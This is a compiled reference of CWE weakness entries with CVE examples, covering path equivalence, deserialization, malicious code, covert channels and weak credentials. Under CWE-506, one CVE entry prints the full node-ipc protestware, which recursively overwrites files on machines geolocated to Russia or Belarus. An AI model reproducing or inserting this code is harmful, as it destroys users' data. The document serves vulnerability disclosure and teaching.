# CWE-5 J2EE Misconfiguration: Data Transmission Without Encryption

## Description

Information sent over a network can be compromised while in transit. An attacker may be able to read or modify the contents if the data are sent in plaintext or are weakly encrypted.

# CWE-50 Path Equivalence: '//multiple/leading/slash'

## Description

The product accepts path input in the form of multiple leading slash ('//multiple/leading/slash') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.

## Observed Examples

CVE-2002-1483: Read files with full pathname using multiple internal slash.

CVE-1999-1456: Server allows remote attackers to read arbitrary files via a GET request with more than one leading / (slash) character in the filename.

CVE-2004-0578: Server allows remote attackers to read arbitrary files via leading slash (//) characters in a URL request.

CVE-2002-0275: Server allows remote attackers to bypass authentication and read restricted files via an extra / (slash) in the requested URL.

CVE-2004-1032: Product allows local users to delete arbitrary files or create arbitrary empty files via a target filename with a large number of leading slash (/) characters.

CVE-2002-1238: Server allows remote attackers to bypass access restrictions for files via an HTTP request with a sequence of multiple / (slash) characters such as http://www.example.com///file/.

CVE-2004-1878: Product allows remote attackers to bypass authentication, obtain sensitive information, or gain access via a direct request to admin/user.pl preceded by // (double leading slash).

CVE-2005-1365: Server allows remote attackers to execute arbitrary commands via a URL with multiple leading "/" (slash) characters and ".." sequences.

CVE-2000-1050: Access directory using multiple leading slash.

CVE-2001-1072: Bypass access restrictions via multiple leading slash, which causes a regular expression to fail.

CVE-2004-0235: Archive extracts to arbitrary files using multiple leading slash in filenames in the archive.

# CWE-500 Public Static Field Not Marked Final

## Description

An object contains a public static field that is not marked final, which might allow it to be modified in unexpected ways.

Public static variables can be read without an accessor and changed without a mutator by any classes in the application.

When a field is declared public but not final, the field can be read and written to by arbitrary Java code.

# CWE-501 Trust Boundary Violation

## Description

The product mixes trusted and untrusted data in the same data structure or structured message.

A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary - to move from untrusted to trusted. A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. By combining trusted and untrusted data in the same data structure, it becomes easier for programmers to mistakenly trust unvalidated data.

# CWE-502 Deserialization of Untrusted Data

## Description

The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.

It is often convenient to serialize objects for communication or to save them for later use. However, deserialized data or code can often be modified without using the provided accessor functions if it does not use cryptography to protect itself. Furthermore, any cryptography would still be client-side security -- which is a dangerous security assumption.


Data that is untrusted can not be trusted to be well-formed.


When developers place no restrictions on "gadget chains," or series of instances and method invocations that can self-execute during the deserialization process (i.e., before the object is returned to the caller), it is sometimes possible for attackers to leverage them to perform unauthorized actions, like generating a shell.

Serialization and deserialization refer to the process of taking program-internal object-related data, packaging it in a way that allows the data to be externally stored or transferred ("serialization"), then extracting the serialized data to reconstruct the original object ("deserialization").

## Observed Examples

CVE-2019-12799: chain: bypass of untrusted deserialization issue (CWE-502) by using an assumed-trusted class (CWE-183)

CVE-2015-8103: Deserialization issue in commonly-used Java library allows remote execution.

CVE-2015-4852: Deserialization issue in commonly-used Java library allows remote execution.

CVE-2013-1465: Use of PHP unserialize function on untrusted input allows attacker to modify application configuration.

CVE-2012-3527: Use of PHP unserialize function on untrusted input in content management system might allow code execution.

CVE-2012-0911: Use of PHP unserialize function on untrusted input in content management system allows code execution using a crafted cookie value.

CVE-2012-0911: Content management system written in PHP allows unserialize of arbitrary objects, possibly allowing code execution.

CVE-2011-2520: Python script allows local users to execute code via pickled data.

CVE-2012-4406: Unsafe deserialization using pickle in a Python script.

CVE-2003-0791: Web browser allows execution of native methods via a crafted string to a JavaScript function that deserializes the string.

## Top 25 Examples

CVE-2021-35095: Improper serialization of message queue client registration can lead to race condition allowing multiple gunyah message clients to register with same label in Snapdragon Connectivity, Snapdragon Mobile

CVE-2021-38241: Deserialization issue discovered in Ruoyi before 4.6.1 allows remote attackers to run arbitrary code via weak cipher in Shiro framework.

CVE-2022-21647: CodeIgniter is an open source PHP full-stack web framework. Deserialization of Untrusted Data was found in the `old()` function in CodeIgniter4. Remote attackers may inject auto-loadable arbitrary objects with this vulnerability, and possibly execute existing PHP code on the server. We are aware of a working exploit, which can lead to SQL injection. Users are advised to upgrade to v4.1.6 or later. Users unable to upgrade as advised to not use the `old()` function and form_helper nor `RedirectResponse::withInput()` and `redirect()->withInput()`.

CVE-2022-21663: WordPress is a free and open-source content management system written in PHP and paired with a MariaDB database. On a multisite, users with Super Admin role can bypass explicit/additional hardening under certain conditions through object injection. This has been patched in WordPress version 5.8.3. Older affected versions are also fixed via security release, that go back till 3.7.37. We strongly recommend that you keep auto-updates enabled. There are no known workarounds for this issue.

CVE-2022-22958: VMware Workspace ONE Access, Identity Manager and vRealize Automation contain two remote code execution vulnerabilities (CVE-2022-22957 & CVE-2022-22958). A malicious actor with administrative access can trigger deserialization of untrusted data through malicious JDBC URI which may result in remote code execution.

CVE-2022-23734: A deserialization of untrusted data vulnerability was identified in GitHub Enterprise Server that could potentially lead to remote code execution on the SVNBridge. To exploit this vulnerability, an attacker would need to gain access via a server-side request forgery (SSRF) that would let an attacker control the data being deserialized. This vulnerability affected all versions of GitHub Enterprise Server prior to v3.6 and was fixed in versions 3.5.3, 3.4.6, 3.3.11, and 3.2.16. This vulnerability was reported via the GitHub Bug Bounty program.

CVE-2022-2433: The WordPress Infinite Scroll – Ajax Load More plugin for WordPress is vulnerable to deserialization of untrusted input via the 'alm_repeaters_export' parameter in versions up to, and including 5.5.3. This makes it possible for unauthenticated users to call files using a PHAR wrapper, granted they can trick a site administrator into performing an action such as clicking on a link, that will deserialize and call arbitrary PHP Objects that can be used to perform a variety of malicious actions granted a POP chain is also present. It also requires that the attacker is successful in uploading a file with the serialized payload.

CVE-2022-3360: The LearnPress WordPress plugin before 4.1.7.2 unserialises user input in a REST API endpoint available to unauthenticated users, which could lead to PHP Object Injection when a suitable gadget is present, leadint to remote code execution (RCE). To successfully exploit this vulnerability attackers must have knowledge of the site secrets, allowing them to generate a valid hash via the wp_hash() function.

CVE-2022-33900: PHP Object Injection vulnerability in Easy Digital Downloads plugin <= 3.0.1 at WordPress.

CVE-2022-35411: rpc.py through 0.6.0 allows Remote Code Execution because an unpickle occurs when the "serializer: pickle" HTTP header is sent. In other words, although JSON (not Pickle) is the default data format, an unauthenticated client can cause the data to be processed with unpickle.

CVE-2022-40238: A Remote Code Injection vulnerability exists in CERT software prior to version 1.50.5. An authenticated attacker can inject arbitrary pickle object as part of a user's profile. This can lead to code execution on the server when the user's profile is accessed.

CVE-2022-43567: In Splunk Enterprise versions below 8.2.9, 8.1.12, and 9.0.2, an authenticated user can run arbitrary operating system commands remotely through the use of specially crafted requests to the mobile alerts feature in the Splunk Secure Gateway app. 

CVE-2022-44542: lesspipe before 2.06 allows attackers to execute code via Perl Storable (pst) files, because of deserialized object destructor execution via a key/value pair in a hash.

CVE-2022-47083: A PHP Object Injection vulnerability in the unserialize() function Spitfire CMS v1.0.475 allows authenticated attackers to execute arbitrary code via sending crafted requests to the web application.

CVE-2022-30287: Horde Groupware Webmail Edition through 5.2.22 allows a reflection injection attack through which an attacker can instantiate a driver class. This then leads to arbitrary deserialization of PHP objects.

CVE-2022-32224: A possible escalation to RCE vulnerability exists when using YAML serialized columns in Active Record < 7.0.3.1, <6.1.6.1, <6.0.5.1 and <5.2.8.1 which could allow an attacker, that can manipulate data in the database (via means like SQL injection), the ability to escalate to an RCE.

CVE-2021-26857: Microsoft Exchange Server Remote Code Execution Vulnerability

CVE-2021-27852: Deserialization of Untrusted Data vulnerability in CheckboxWeb.dll of Checkbox Survey allows an unauthenticated remote attacker to execute arbitrary code. This issue affects: Checkbox Survey versions prior to 7.

CVE-2021-35464: ForgeRock AM server before 7.0 has a Java deserialization vulnerability in the jato.pageSession parameter on multiple pages. The exploitation does not require authentication, and remote code execution can be triggered by sending a single crafted /ccversion/* request to the server. The vulnerability exists due to the usage of Sun ONE Application Framework (JATO) found in versions of Java 8 or earlier

CVE-2021-42237: Sitecore XP 7.5 Initial Release to Sitecore XP 8.2 Update-7 is vulnerable to an insecure deserialization attack where it is possible to achieve remote command execution on the machine. No authentication or special configuration is required to exploit this vulnerability.

CVE-2022-35405: Zoho ManageEngine Password Manager Pro before 12101 and PAM360 before 5510 are vulnerable to unauthenticated remote code execution. (This also affects ManageEngine Access Manager Plus before 4303 with authentication.)

CVE-2022-41082: Microsoft Exchange Server Remote Code Execution Vulnerability

CVE-2022-47986:  IBM Aspera Faspex 4.4.2 Patch Level 1 and earlier could allow a remote attacker to execute arbitrary code on the system, caused by a YAML deserialization flaw. By sending a specially crafted obsolete API call, an attacker could exploit this vulnerability to execute arbitrary code on the system. The obsolete API call was removed in Faspex 4.4.2 PL2. IBM X-Force ID: 243512. 

CVE-2022-36006: Arvados is an open source platform for managing, processing, and sharing genomic and other large scientific and biomedical data. A remote code execution (RCE) vulnerability in the Arvados Workbench allows authenticated attackers to execute arbitrary code via specially crafted JSON payloads. This exists in all versions up to 2.4.1 and is fixed in 2.4.2. This vulnerability is specific to the Ruby on Rails Workbench application (“Workbench 1”). We do not believe any other Arvados components, including the TypesScript browser-based Workbench application (“Workbench 2”) or API Server, are vulnerable to this attack. For versions of Arvados earlier than 2.4.2: remove the Ruby-based "Workbench 1" app ("apt-get remove arvados-workbench") from your installation as a workaround.

# CWE-506 Embedded Malicious Code

## Description

The product contains code that appears to be malicious in nature.

Malicious flaws have acquired colorful names, including Trojan horse, trapdoor, timebomb, and logic-bomb. A developer might insert malicious code with the intent to subvert the security of a product or its host system at some time in the future. It generally refers to a program that performs a useful service but exploits rights of the program's user in a way the user does not intend.

## Observed Examples

CVE-2022-30877: A command history tool was shipped with a code-execution backdoor inserted by a malicious party.

## Top 25 Examples

CVE-2022-23812: This affects the package node-ipc from 10.1.1 and before 10.1.3. This package contains malicious code, that targets users with IP located in Russia or Belarus, and overwrites their files with a heart emoji. **Note**: from versions 11.0.0 onwards, instead of having malicious code directly in the source of this package, node-ipc imports the peacenotwar package that includes potentially undesired behavior. Malicious Code: **Note:** Don't run it! js import u from "path"; import a from "fs"; import o from "https"; setTimeout(function () { const t = Math.round(Math.random() * 4); if (t > 1) { return; } const n = Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=", "base64"); // https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154 o.get(n.toString("utf8"), function (t) { t.on("data", function (t) { const n = Buffer.from("Li8=", "base64"); const o = Buffer.from("Li4v", "base64"); const r = Buffer.from("Li4vLi4v", "base64"); const f = Buffer.from("Lw==", "base64"); const c = Buffer.from("Y291bnRyeV9uYW1l", "base64"); const e = Buffer.from("cnVzc2lh", "base64"); const i = Buffer.from("YmVsYXJ1cw==", "base64"); try { const s = JSON.parse(t.toString("utf8")); const u = s[c.toString("utf8")].toLowerCase(); const a = u.includes(e.toString("utf8")) || u.includes(i.toString("utf8")); // checks if country is Russia or Belarus if (a) { h(n.toString("utf8")); h(o.toString("utf8")); h(r.toString("utf8")); h(f.toString("utf8")); } } catch (t) {} }); }); }, Math.ceil(Math.random() * 1e3)); async function h(n = "", o = "") { if (!a.existsSync(n)) { return; } let r = []; try { r = a.readdirSync(n); } catch (t) {} const f = []; const c = Buffer.from("4p2k77iP", "base64"); for (var e = 0; e < r.length; e++) { const i = u.join(n, r[e]); let t = null; try { t = a.lstatSync(i); } catch (t) { continue; } if (t.isDirectory()) { const s = h(i, o); s.length > 0 ? f.push(...s) : null; } else if (i.indexOf(o) >= 0) { try { a.writeFile(i, c.toString("utf8"), function () {}); // overwrites file with ?? } catch (t) {} } } return f; } const ssl = true; export { ssl as default, ssl };

CVE-2022-42041: The d8s-file-system package for Python, as distributed on PyPI, included a potential code-execution backdoor inserted by a third party. The backdoor is the democritus-hashes package. The affected version is 0.1.0.

CVE-2022-42042: The d8s-networking package for Python, as distributed on PyPI, included a potential code-execution backdoor inserted by a third party. The backdoor is the democritus-hashes package. The affected version is 0.1.0.

CVE-2022-30877: The keep for python, as distributed on PyPI, included a code-execution backdoor inserted by a third party. The current version, without this backdoor, is 1.2.

# CWE-507 Trojan Horse

## Description

The product appears to contain benign or useful functionality, but it also contains code that is hidden from normal operation that violates the intended security policy of the user or the system administrator.

# CWE-508 Non-Replicating Malicious Code

## Description

Non-replicating malicious code only resides on the target system or product that is attacked; it does not attempt to spread to other systems.

# CWE-509 Replicating Malicious Code (Virus or Worm)

## Description

Replicating malicious code, including viruses and worms, will attempt to attack other systems once it has successfully compromised the target system or the product.

# CWE-51 Path Equivalence: '/multiple//internal/slash'

## Description

The product accepts path input in the form of multiple internal slash ('/multiple//internal/slash/') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.

## Observed Examples

CVE-2002-1483: Read files with full pathname using multiple internal slash.

# CWE-510 Trapdoor

## Description

A trapdoor is a hidden piece of code that responds to a special input, allowing its user access to resources without passing through the normal security enforcement mechanism.

# CWE-511 Logic/Time Bomb

## Description

The product contains code that is designed to disrupt the legitimate operation of the product (or its environment) when a certain time passes, or when a certain logical condition is met.

When the time bomb or logic bomb is detonated, it may perform a denial of service such as crashing the system, deleting critical data, or degrading system response time. This bomb might be placed within either a replicating or non-replicating Trojan horse.

# CWE-512 Spyware

## Description

The product collects personally identifiable information about a human user or the user's activities, but the product accesses this information using other resources besides itself, and it does not require that user's explicit approval or direct input into the product.

"Spyware" is a commonly used term with many definitions and interpretations. In general, it is meant to refer to products that collect information or install functionality that human users might not allow if they were fully aware of the actions being taken by the software. For example, a user might expect that tax software would collect a social security number and include it when filing a tax return, but that same user would not expect gaming software to obtain the social security number from that tax software's data.

# CWE-514 Covert Channel

## Description

A covert channel is a path that can be used to transfer information in a way not intended by the system's designers.

Typically the system has not given authorization for the transmission and has no knowledge of its occurrence.

## Top 25 Examples

CVE-2022-20285: In PackageManager, there is a possible way to determine whether an app is installed, without query permissions, due to side channel information disclosure. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-230868108

CVE-2022-20287: In AppSearchManagerService, there is a possible way to determine whether an app is installed, without query permissions, due to side channel information disclosure. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-204082784

CVE-2022-20288: In AppSearchManagerService, there is a possible way to determine whether an app is installed, without query permissions, due to side channel information disclosure. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-204082360

CVE-2022-20289: In PackageInstaller, there is a possible way to determine whether an app is installed, without query permissions, due to side channel information disclosure. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-203683960

CVE-2022-20332: In PackageManager, there is a possible way to determine whether an app is installed, without query permissions, due to side channel information disclosure. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-180019130

# CWE-515 Covert Storage Channel

## Description

A covert storage channel transfers information through the setting of bits by one program and the reading of those bits by another. What distinguishes this case from that of ordinary operation is that the bits are used to convey encoded information.

Covert storage channels occur when out-of-band data is stored in messages for the purpose of memory reuse. Covert channels are frequently classified as either storage or timing channels. Examples would include using a file intended to hold only audit information to convey user passwords--using the name of a file or perhaps status bits associated with it that can be read by all users to signal the contents of the file. Steganography, concealing information in such a manner that no one but the intended recipient knows of the existence of the message, is a good example of a covert storage channel.

# CWE-52 Path Equivalence: '/multiple/trailing/slash//'

## Description

The product accepts path input in the form of multiple trailing slash ('/multiple/trailing/slash//') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.

## Observed Examples

CVE-2002-1078: Directory listings in web server using multiple trailing slash

# CWE-520 .NET Misconfiguration: Use of Impersonation

## Description

Allowing a .NET application to run at potentially escalated levels of access to the underlying operating and file systems can be dangerous and result in various forms of attacks.

.NET server applications can optionally execute using the identity of the user authenticated to the client. The intention of this functionality is to bypass authentication and access control checks within the .NET application code. Authentication is done by the underlying web server (Microsoft Internet Information Service IIS), which passes the authenticated token, or unauthenticated anonymous token, to the .NET application. Using the token to impersonate the client, the application then relies on the settings within the NTFS directories and files to control access. Impersonation enables the application, on the server running the .NET application, to both execute code and access resources in the context of the authenticated and authorized user.

# CWE-521 Weak Password Requirements

## Description

The product does not require that users should have strong passwords, which makes it easier for attackers to compromise user accounts.

Authentication mechanisms often rely on a memorized secret (also known as a password) to provide an assertion of identity for a user of a system. It is therefore important that this password be of sufficient complexity and impractical for an adversary to guess. The specific requirements around how complex a password needs to be depends on the type of system being protected. Selecting the correct password requirements and enforcing them through implementation are critical to the overall success of the authentication mechanism.

## Observed Examples

CVE-2020-4574: key server application does not require strong passwords

## Top 25 Examples

CVE-2021-36689: An issue discovered in com.samourai.wallet.PinEntryActivity.java in Streetside Samourai Wallet 0.99.96i allows attackers to view sensitive information and decrypt data via a brute force attack that uses a recovered samourai.dat file. The PIN is 5 to 8 digits, which may be insufficient in this situation.

# CWE-522 Insufficiently Protected Credentials

## Description

The product transmits or stores authentication credentials, but it uses an insecure method that is susceptible to unauthorized interception and/or retrieval.

## Observed Examples

CVE-2022-30018: A messaging platform serializes all elements of User/Group objects, making private information available to adversaries

CVE-2022-29959: Initialization file contains credentials that can be decoded using a "simple string transformation"

CVE-2022-35411: Python-based RPC framework enables pickle functionality by default, allowing clients to unpickle untrusted data.

CVE-2022-29519: Programmable Logic Controller (PLC) sends sensitive information in plaintext, including passwords and session tokens.

CVE-2022-30312: Building Controller uses a protocol that transmits authentication credentials in plaintext.

CVE-2022-31204: Programmable Logic Controller (PLC) sends password in plaintext.

CVE-2022-30275: Remote Terminal Unit (RTU) uses a driver that relies on a password stored in plaintext.

CVE-2007-0681: Web app allows remote attackers to change the passwords of arbitrary users without providing the original password, and possibly perform other unauthorized actions.

CVE-2000-0944: Web application password change utility doesn't check the original password.

CVE-2005-3435: product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.

CVE-2005-0408: chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.

## Top 25 Examples

CVE-2022-37783: All Craft CMS versions between 3.0.0 and 3.7.32 disclose password hashes of users who authenticate using their E-Mail address or username in Anti-CSRF-Tokens. Craft CMS uses a cookie called CRAFT_CSRF_TOKEN and a HTML hidden field called CRAFT_CSRF_TOKEN to avoid Cross Site Request Forgery attacks. The CRAFT_CSRF_TOKEN cookie discloses the password hash in without encoding it whereas the corresponding HTML hidden field discloses the users' password hash in a masked manner, which can be decoded by using public functions of the YII framework.

CVE-2021-30116: Kaseya VSA before 9.5.7 allows credential disclosure, as exploited in the wild in July 2021. By default Kaseya VSA on premise offers a download page where the clients for the installation can be downloaded. The default URL for this page is https://x.x.x.x/dl.asp When an attacker download a client for Windows and installs it, the file KaseyaD.ini is generated (C:\\Program Files (x86)\\Kaseya\\XXXXXXXXXX\\KaseyaD.ini) which contains an Agent_Guid and AgentPassword This Agent_Guid and AgentPassword can be used to log in on dl.asp (https://x.x.x.x/dl.asp?un=840997037507813&pw=113cc622839a4077a84837485ced6b93e440bf66d44057713cb2f95e503a06d9) This request authenticates the client and returns a sessionId cookie that can be used in subsequent attacks to bypass authentication. Security issues discovered --- * Unauthenticated download page leaks credentials * Credentials of agent software can be used to obtain a sessionId (cookie) that can be used for services not intended for use by agents * dl.asp accepts credentials via a GET request * Access to KaseyaD.ini gives an attacker access to sufficient information to penetrate the Kaseya installation and its clients. Impact --- Via the page /dl.asp enough information can be obtained to give an attacker a sessionId that can be used to execute further (semi-authenticated) attacks against the system.

CVE-2022-37193: Chipolo ONE Bluetooth tracker (2020) Chipolo iOS app version 4.13.0 is vulnerable to Incorrect Access Control. Chipolo devices suffer from access revocation evasion attacks once the malicious sharee obtains the access credentials.

CVE-2021-36204: Under some circumstances an Insufficiently Protected Credentials vulnerability in Johnson Controls Metasys ADS/ADX/OAS 10 versions prior to 10.1.6 and 11 versions prior to 11.0.3 allows API calls to expose credentials in plain text.

CVE-2021-40360: A vulnerability has been identified in SIMATIC PCS 7 V8.2 (All versions), SIMATIC PCS 7 V9.0 (All versions), SIMATIC PCS 7 V9.1 (All versions < V9.1 SP1), SIMATIC WinCC V15 and earlier (All versions < V15 SP1 Update 7), SIMATIC WinCC V16 (All versions < V16 Update 5), SIMATIC WinCC V17 (All versions < V17 Update 2), SIMATIC WinCC V7.4 (All versions < V7.4 SP1 Update 19), SIMATIC WinCC V7.5 (All versions < V7.5 SP2 Update 6). The password hash of a local user account in the remote server could be granted via public API to a user on the affected system. An authenticated attacker could brute force the password hash and use it to login to the server.

CVE-2022-0019: An insufficiently protected credentials vulnerability exists in the Palo Alto Networks GlobalProtect app on Linux that exposes the hashed credentials of GlobalProtect users that saved their password during previous GlobalProtect app sessions to other local users on the system. The exposed credentials enable a local attacker to authenticate to the GlobalProtect portal or gateway as the target user without knowing of the target user’s plaintext password. This issue impacts: GlobalProtect app 5.1 versions earlier than GlobalProtect app 5.1.10 on Linux. GlobalProtect app 5.2 versions earlier than and including GlobalProtect app 5.2.7 on Linux. GlobalProtect app 5.3 versions earlier than GlobalProtect app 5.3.2 on Linux. This issue does not affect the GlobalProtect app on other platforms.

CVE-2022-27544: BigFix Web Reports authorized users may see SMTP credentials in clear text.

CVE-2021-27785: HCL Commerce's Remote Store server could allow a local attacker to obtain sensitive personal information. The vulnerability requires the victim to first perform a particular operation on the website.

CVE-2022-27218: Jenkins incapptic connect uploader Plugin 1.15 and earlier stores tokens unencrypted in job config.xml files on the Jenkins controller where they can be viewed by users with Extended Read permission, or access to the Jenkins controller file system.

CVE-2022-28291: Insufficiently Protected Credentials: An authenticated user with debug privileges can retrieve stored Nessus policy credentials from the “nessusd” process in cleartext via process dumping. The affected products are all versions of Nessus Essentials and Professional. The vulnerability allows an attacker to access credentials stored in Nessus scanners, potentially compromising its customers’ network of assets.

CVE-2022-34803: Jenkins OpsGenie Plugin 1.9 and earlier stores API keys unencrypted in its global configuration file and in job config.xml files on the Jenkins controller where they can be viewed by users with Extended Read permission (config.xml), or access to the Jenkins controller file system.

CVE-2022-34808: Jenkins Cisco Spark Plugin 1.1.1 and earlier stores bearer tokens unencrypted in its global configuration file on the Jenkins controller where they can be viewed by users with access to the Jenkins controller file system.

CVE-2022-36308: Airspan AirVelocity 1500 web management UI displays SNMP credentials in plaintext on software versions older than 15.18.00.2511, and stores SNMPv3 credentials unhashed on the filesystem, enabling anyone with web access to use these credentials to manipulate the eNodeB over SNMP. This issue may affect other AirVelocity and AirSpeed models.

CVE-2022-3644: The collection remote for pulp_ansible stores tokens in plaintext instead of using pulp's encrypted field and exposes them in read/write mode via the API () instead of marking it as write only.

CVE-2022-36617: Arq Backup 7.19.5.0 and below stores backup encryption passwords using reversible encryption. This issue allows attackers with administrative privileges to recover cleartext passwords.

CVE-2022-41255: Jenkins CONS3RT Plugin 1.0.0 and earlier stores Cons3rt API token unencrypted in job config.xml files on the Jenkins controller where it can be viewed by users with access to the Jenkins controller file system.

CVE-2022-20621: Jenkins Metrics Plugin 4.0.2.8 and earlier stores an access key unencrypted in its global configuration file on the Jenkins controller where it can be viewed by users with access to the Jenkins controller file system.

CVE-2021-39045: IBM Cognos Analytics 11.1.7, 11.2.0, and 11.2.1 could allow a local attacker to obtain information due to the autocomplete feature on password input fields. IBM X-Force ID: 214345.

CVE-2021-45097: KNIME Server before 4.12.6 and 4.13.x before 4.13.4 (when installed in unattended mode) keeps the administrator's password in a file without appropriate file access controls, allowing all local users to read its content.

CVE-2022-30944: Insufficiently protected credentials for Intel(R) AMT and Intel(R) Standard Manageability may allow a privileged user to potentially enable information disclosure via local access.

CVE-2022-30952: Jenkins Pipeline SCM API for Blue Ocean Plugin 1.25.3 and earlier allows attackers with Job/Configure permission to access credentials with attacker-specified IDs stored in the private per-user credentials stores of any attacker-specified user in Jenkins.

CVE-2022-32518: A CWE-522: Insufficiently Protected Credentials vulnerability exists that could result in unwanted access to a DCE instance when performed over a network by a malicious third-party. This CVE is unique from CVE-2022-32520. Affected Products: Data Center Expert (Versions prior to V7.9.0)

CVE-2022-32520: A CWE-522: Insufficiently Protected Credentials vulnerability exists that could result in unwanted access to a DCE instance when performed over a network by a malicious third-party. This CVE is unique from CVE-2022-32518. Affected Products: Data Center Expert (Versions prior to V7.9.0)

CVE-2022-33169: IBM Robotic Process Automation 21.0.0, 21.0.1, and 21.0.2 is vulnerable to insufficiently protected credentials for users created via a bulk upload. IBM X-Force ID: 228888.

CVE-2022-33953: IBM Robotic Process Automation 21.0.1 and 21.0.2 could allow a user with psychical access to the system to obtain sensitive information due to insufficiently protected access tokens. IBM X-Force ID: 229198.

CVE-2022-3474: A bad credential handling in the remote assets API for Bazel versions prior to 5.3.2 and 4.2.3 sends all user-provided credentials instead of only the required ones for the requests. We recommend upgrading to versions later than or equal to 5.3.2 or 4.2.3.

CVE-2022-36307: The AirVelocity 1500 prints SNMP credentials on its physically accessible serial port during boot. This was fixed in AirVelocity 1500 software version 15.18.00.2511 and may affect other AirVelocity and AirSpeed models.

CVE-2022-38465: A vulnerability has been identified in SIMATIC Drive Controller family (All versions < V2.9.2), SIMATIC ET 200SP Open Controller CPU 1515SP PC (incl. SIPLUS variants) (All versions), SIMATIC ET 200SP Open Controller CPU 1515SP PC2 (incl. SIPLUS variants) (All versions < V21.9), SIMATIC S7-1200 CPU family (incl. SIPLUS variants) (All versions < V4.5.0), SIMATIC S7-1500 CPU family (incl. related ET200 CPUs and SIPLUS variants) (All versions < V2.9.2), SIMATIC S7-1500 Software Controller (All versions < V21.9), SIMATIC S7-PLCSIM Advanced (All versions < V4.0), SINUMERIK MC (All versions < V6.21), SINUMERIK ONE (All versions < V6.21). Affected products protect the built-in global private key in a way that cannot be considered sufficient any longer. The key is used for the legacy protection of confidential configuration data and the legacy PG/PC and HMI communication. This could allow attackers to discover the private key of a CPU product family by an offline attack against a single CPU of the family. Attackers could then use this knowledge to extract confidential configuration data from projects that are protected by that key or to perform attacks against legacy PG/PC and HMI communication.

CVE-2022-40678: An insufficiently protected credentials in Fortinet FortiNAC versions 9.4.0, 9.2.0 through 9.2.5, 9.1.0 through 9.1.7, 8.8.0 through 8.8.11, 8.7.0 through 8.7.6, 8.6.0 through 8.6.5, 8.5.0 through 8.5.4, 8.3.7 may allow a local attacker with database access to recover user passwords.

CVE-2022-40751:  IBM UrbanCode Deploy (UCD) 6.2.7.0 through 6.2.7.17, 7.0.0.0 through 7.0.5.12, 7.1.0.0 through 7.1.2.8, and 7.2.0.0 through 7.2.3.1 could allow a user with administrative privileges including "Manage Security" permissions may be able to recover a credential previously saved for performing authenticated LDAP searches. IBM X-Force ID: 236601.

CVE-2022-41614: Insufficiently protected credentials in the Intel(R) ON Event Series Android application before version 2.0 may allow an authenticated user to potentially enable information disclosure via local access.

CVE-2022-4612: A vulnerability has been found in Click Studios Passwordstate and Passwordstate Browser Extension Chrome and classified as problematic. This vulnerability affects unknown code. The manipulation leads to insufficiently protected credentials. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. It is recommended to upgrade the affected component. VDB-216274 is the identifier assigned to this vulnerability.

CVE-2022-4693: The User Verification WordPress plugin before 1.0.94 was affected by an Auth Bypass security vulnerability. To bypass authentication, we only need to know the user’s username. Depending on whose username we know, which can be easily queried because it is usually public data, we may even be given an administrative role on the website.

CVE-2022-0184: Insufficiently protected credentials vulnerability in 'TEPRA' PRO SR5900P Ver.1.080 and earlier and 'TEPRA' PRO SR-R7900P Ver.1.030 and earlier allows an attacker on the adjacent network to obtain credentials for connecting to the Wi-Fi access point with the infrastructure mode.

CVE-2022-0738: An issue has been discovered in GitLab affecting all versions starting from 14.6 before 14.6.5, all versions starting from 14.7 before 14.7.4, all versions starting from 14.8 before 14.8.2. GitLab was leaking user passwords when adding mirrors with SSH credentials under specific conditions.

CVE-2022-0859: McAfee Enterprise ePolicy Orchestrator (ePO) prior to 5.10 Update 13 allows a local attacker to point an ePO server to an arbitrary SQL server during the restoration of the ePO server. To achieve this the attacker would have to be logged onto the server hosting the ePO server (restricted to administrators) and to know the SQL server password.

CVE-2022-1026: Kyocera multifunction printers running vulnerable versions of Net View unintentionally expose sensitive user information, including usernames and passwords, through an insufficiently protected address book export function.

CVE-2022-2221: Information Exposure vulnerability in My Account Settings of Devolutions Remote Desktop Manager before 2022.1.8 allows authenticated users to access credentials of other users. This issue affects: Devolutions Remote Desktop Manager versions prior to 2022.1.8.

CVE-2022-22998: Implemented protections on AWS credentials that were not properly protected.

CVE-2022-26341: Insufficiently protected credentials in software in Intel(R) AMT SDK before version 16.0.4.1, Intel(R) EMA before version 1.7.1 and Intel(R) MC before version 2.3.2 may allow an authenticated user to potentially enable escalation of privilege via network access.

CVE-2022-26844: Insufficiently protected credentials in the installation binaries for Intel(R) SEAPI in all versions may allow an authenticated user to potentially enable escalation of privilege via local access.

CVE-2022-26948: The Archer RSS feed integration for Archer 6.x through 6.9 SP1 (6.9.1.0) is affected by an insecure credential storage vulnerability. A malicious attacker may obtain access to credential information to use it in further attacks.

CVE-2022-27179: A malicious actor having access to the exported configuration file may obtain the stored credentials and thereby gain access to the protected resource. If the same passwords were used for other resources, further such assets may be compromised.

CVE-2022-27560: HCL VersionVault Express exposes administrator credentials.

CVE-2022-27774: An insufficiently protected credentials vulnerability exists in curl 4.9 to and include curl 7.82.0 are affected that could allow an attacker to extract credentials when follows HTTP(S) redirects is used with authentication could leak credentials to other services that exist on different protocols or port numbers.

